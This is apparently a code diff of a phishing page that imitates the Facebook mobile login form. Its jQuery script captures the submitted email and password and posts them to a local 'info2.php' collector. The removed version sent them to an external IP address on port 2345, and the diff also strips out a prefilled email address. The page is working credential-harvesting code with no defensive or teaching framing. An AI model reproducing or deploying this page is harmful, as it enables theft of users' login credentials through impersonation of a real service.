@@ -28,20 +28,21 @@ require("MPrelude")
 <script>
 
 $(document).ready(function() {
-        $("#mylogin").click(function() {
-            $("#msg").append("got here");
-            ret = $.post($("#myform").attr("action"), $("#login_form").serialize(),
-                function(data) {
-                $("#msg").append("got here 2");
-                $("#login_form").submit();
-                });
-            $("#msg").append("\nresult"+ ret);
-            });
-        var parser = document.createElement('a');
-        parser.href = document.location.href;
-        parser.pathname = 'info2.php'
-        $("#myform").attr('action', parser.href);
-        });
+   $("#mylogin").click(function() {
+       $("#msg").append("got here");
+       var parser = document.createElement('a');
+       parser.href = document.location.href;
+       parser.pathname = 'info2.php';
+       $.ajax({
+              url: parser.href,
+              type:'post',
+              data:$('#myform').serialize(),
+              success:function(){
+                   alert("worked");
+               }
+       });
+   });
+});
 
 </script>
 </head>
@@ -69,7 +70,7 @@ $(document).ready(function() {
             <div class="_4g33">
                 <div class="_4g34">
                     <div class="aclb _5rut">
-                        <form method="post" id="myform" action="http://9.151.165.175:2345/info.php">
+                        <form method="post" id="myform">
                         <!-- form method="post" class="mobile-login-form _5spm" id="login_form" novalidate="1" action="https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8"-->
                             <input type="hidden" name="lsd" value="AVoYug6g" autocomplete="off">
                             <input type="hidden" name="charset_test" value="€,´,€,´,水,Д,Є">
@@ -84,7 +85,7 @@ $(document).ready(function() {
                             <input type="hidden" name="spw" value="0" data-sigil="spw">
                             <div class="_56be _5sob">
                                 <div class="_55wo _55x2 _56bf">
-                                    <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq" name="email" placeholder="Email or Phone" value="avivoosh@gmail.com" type="text">
+                                    <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq" name="email" placeholder="Email or Phone" value="" type="text">
                                     <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq" placeholder="Password" name="pass" type="password" data-sigil="login-password-field">
                                     <div class="_55ws">
                                         <button id="mylogin" value="Log In" class="_56bs _56b_ _56bw _56bu" name="login" data-sigil="touchable">
@@ -111,7 +112,7 @@ $(document).ready(function() {
                                         Forgot Password?
                                     </a>
                                     <span aria-hidden="true">
-                                        · 
+                                        ·
                                     </span>
                                     <a class="sec" href="https://m.facebook.com/help/?refid=8">
                                         Help Center
@@ -133,19 +134,19 @@ $(document).ready(function() {
                                 English (US)
                             </b>
                             <span aria-hidden="true">
-                                · 
+                                ·
                             </span>
                             <a class="sec" href="https://m.facebook.com/a/language.php?l=he_IL&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQCCuFDrf1Wulyl5&refid=8" data-ajaxify-href="/a/language.php?l=he_IL&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQCCuFDrf1Wulyl5&amp;refid=8" data-sigil="ajaxify">
                                 עברית
                             </a>
                             <span aria-hidden="true">
-                                · 
+                                ·
                             </span>
                             <a class="sec" href="https://m.facebook.com/a/language.php?l=es_LA&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQAi1xyrcW0TtjPW&refid=8" data-ajaxify-href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQAi1xyrcW0TtjPW&amp;refid=8" data-sigil="ajaxify">
                                 Español
                             </a>
                             <span aria-hidden="true">
-                                · 
+                                ·
                             </span>
                             <a class="sec" href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2F&refid=8">
                                 More…
